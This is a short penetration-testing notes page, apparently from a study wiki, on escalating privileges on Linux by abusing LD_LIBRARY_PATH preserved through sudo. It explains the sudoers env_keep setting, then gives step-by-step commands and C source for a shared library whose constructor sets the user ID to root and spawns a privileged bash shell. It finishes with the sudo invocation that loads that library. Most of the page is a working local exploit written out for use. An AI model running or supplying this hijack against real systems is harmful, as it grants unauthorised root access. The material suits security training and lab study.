# LD\_LIBRARY\_PATH

Programs running via sudo can inherit variables from the environment of the user. If the **env\_reset** option is set in the **/etc/sudoers** config file, sudo will run the programs in a new, minimal _environment_. The **env\_keep** option can be used to keep certain environment variables from the user’s environment. The configured options are displayed when running **sudo -l**.

The **LD\_LIBRARY\_PATH** is inherited from the user's environment. The **LD\_LIBRARY\_PATH** contains a list of directories which search for shared libraries first.&#x20;

### Steps

#### Investigate the sudo-able programs and the libraries used.&#x20;

{% code overflow="wrap" %}
```bash
# Check if you see any sudo configuration for your usrname
sudo -l
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

```bash
# Check if you have libray for the programs. In this case, apache2
ldd /usr/sbin/iftop
... 
ldd /usr/sbin/apache2
```

<figure><img src="../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

#### Compile the following code and make it so library.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

#### Execute to escalate the privilege

<figure><img src="../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

```bash
sudo LD_LIBRARY_PATH=/tmp apache2
```
